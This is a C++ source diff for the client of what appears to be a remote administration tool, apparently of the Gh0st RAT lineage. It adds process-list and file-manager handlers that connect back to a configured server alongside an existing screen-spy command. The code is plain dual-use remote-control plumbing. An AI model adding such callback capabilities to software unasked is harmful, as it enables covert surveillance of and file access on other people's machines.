@@ -23,6 +23,8 @@
 #include <fstream>
 #include <map>
 #include "ScreenHandler.h"
+#include "SystemManager.h"
+#include "FileManager.h"
 #include "common/logger.h"
 
 int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength);
@@ -279,6 +281,46 @@ void* ScreenworkingThread(void* param)
     return NULL;
 }
 
+void* SystemManagerThread(void* param)
+{
+    try {
+        std::unique_ptr<IOCPClient> ClientObject(new IOCPClient(g_bExit, true));
+        void* clientAddr = ClientObject.get();
+        Mprintf(">>> Enter SystemManagerThread [%p]\n", clientAddr);
+        if (!g_bExit && ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort())) {
+            std::unique_ptr<SystemManager> handler(new SystemManager(ClientObject.get()));
+            ClientObject->setManagerCallBack(handler.get(), IOCPManager::DataProcess, IOCPManager::ReconnectProcess);
+            Mprintf(">>> SystemManagerThread [%p] Send: TOKEN_PSLIST\n", clientAddr);
+            while (ClientObject->IsRunning() && ClientObject->IsConnected() && S_CLIENT_NORMAL == g_bExit)
+                Sleep(1000);
+        }
+        Mprintf(">>> Leave SystemManagerThread [%p]\n", clientAddr);
+    } catch (const std::exception& e) {
+        Mprintf("*** SystemManagerThread exception: %s ***\n", e.what());
+    }
+    return NULL;
+}
+
+void* FileManagerThread(void* param)
+{
+    try {
+        std::unique_ptr<IOCPClient> ClientObject(new IOCPClient(g_bExit, true));
+        void* clientAddr = ClientObject.get();
+        Mprintf(">>> Enter FileManagerThread [%p]\n", clientAddr);
+        if (!g_bExit && ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort())) {
+            std::unique_ptr<FileManager> handler(new FileManager(ClientObject.get()));
+            ClientObject->setManagerCallBack(handler.get(), IOCPManager::DataProcess, IOCPManager::ReconnectProcess);
+            Mprintf(">>> FileManagerThread [%p] Send: TOKEN_DRIVE_LIST\n", clientAddr);
+            while (ClientObject->IsRunning() && ClientObject->IsConnected() && S_CLIENT_NORMAL == g_bExit)
+                Sleep(1000);
+        }
+        Mprintf(">>> Leave FileManagerThread [%p]\n", clientAddr);
+    } catch (const std::exception& e) {
+        Mprintf("*** FileManagerThread exception: %s ***\n", e.what());
+    }
+    return NULL;
+}
+
 int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength)
 {
     if (szBuffer == nullptr || ulLength == 0)
@@ -295,6 +337,14 @@ int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength)
     else if (szBuffer[0] == COMMAND_SCREEN_SPY) {
         std::thread(ScreenworkingThread, nullptr).detach();
         Mprintf("** [%p] Received 'SCREEN_SPY' command ***\n", user);
+    }
+    else if (szBuffer[0] == COMMAND_SYSTEM) {
+        std::thread(SystemManagerThread, nullptr).detach();
+        Mprintf("** [%p] Received 'SYSTEM' command ***\n", user);
+    }
+    else if (szBuffer[0] == COMMAND_LIST_DRIVE) {
+        std::thread(FileManagerThread, nullptr).detach();
+        Mprintf("** [%p] Received 'LIST_DRIVE' command ***\n", user);
     }
     else if (szBuffer[0] == COMMAND_NEXT) {
         Mprintf("** [%p] Received 'NEXT' command ***\n", user);
